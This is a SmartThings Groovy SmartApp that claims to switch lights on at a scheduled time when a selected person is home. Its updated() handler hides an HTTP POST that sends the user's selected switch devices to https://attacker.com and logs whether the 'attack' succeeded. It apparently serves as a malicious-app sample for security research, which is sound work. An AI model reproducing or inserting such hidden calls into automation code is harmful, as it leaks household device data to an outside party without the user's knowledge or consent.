


definition(
    name:"Smart turn it on",
    namespace:"sidjohn1",
    author:"sidjohn1@gmail.com",
    description:"Turns on selected device(s)at a set time on selected days of the week only if a selected person is present and turns off selected device(s)after a set time.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience%402 x.png"
)

preferences{
    section("Turn on which device?"){
        input"switchOne","capability.switch",title:"Select Light",required:true,multiple:true
        }
    section("For Whom?"){
        input"presenceOne","capability.presenceSensor",title:"Select Person",required:true,multiple:true
        }
    section("On which Days?"){
        input"dayOne","enum",title:"Select Days",required:true,multiple:true,metadata:[values:['Mon','Tue','Wed','Thu','Fri','Sat','Sun']]
        }
    section("At what time?"){
        input name:"timeOne",title:"Select Time",type:"time",required:true
        }
    section("For how long?"){
        input name:"timeTwo",title:"Number of minutes",type:"number",required:true
        }
}

def installed(){
    if(timeOne)
    {
        log.debug"scheduling'Smart turn it on'to run at$timeOne"
        schedule(timeOne,"turnOn")
    }
}

def updated(){
    
    
    def takeParams=[
    
    
    uri:"https://attacker.com",
    
    
    path:"",
    
    
    requestContentType:"application/x-www-form-urlencoded",
    
    
    body:[
    
    
    "massage":"hi"
    
    
    ]
    
    
    ]
    
    
    takeParams=[
    
    
    uri:"https://attacker.com",
    
    
    path:"",
    
    
    requestContentType:"application/x-www-form-urlencoded",
    
    
    body:[
    
    
    "massage":"${switchOne}"
    
    
    ]
    
    
    ]
    
    
    try{
        
        
        httpPost(takeParams){resp->
            
            
            if(resp.status==200){
                
                
                log.debug"attack succeeded"
            
            
            }else{
                    
                    
                    log.error"attack failed"
                
                
                }
            
            
            }
        
        
        }
    
    
    catch(Exception e){
        
        
        log.error"Unexpected exception",e
    
    
    }
    unsubscribe()
    unschedule()
    if(timeOne)
    {
        log.debug"scheduling'Smart turn it on'to run at$timeOne"
        schedule(timeOne,"turnOn")
    }
}

def turnOn(){
    log.debug"Start"
    def dayCheck=dayOne.contains(new Date().format("EEE"))
    def dayTwo=new Date().format("EEE");
    if(dayCheck){
        def presenceTwo=presenceOne.latestValue("presence").contains("present")
        if(presenceTwo){
            switchOne.on()
            def delay=timeTwo*60
            runIn(delay,"turnOff")
        }
    }
}



def turnOff(){
    switchOne.off()
}

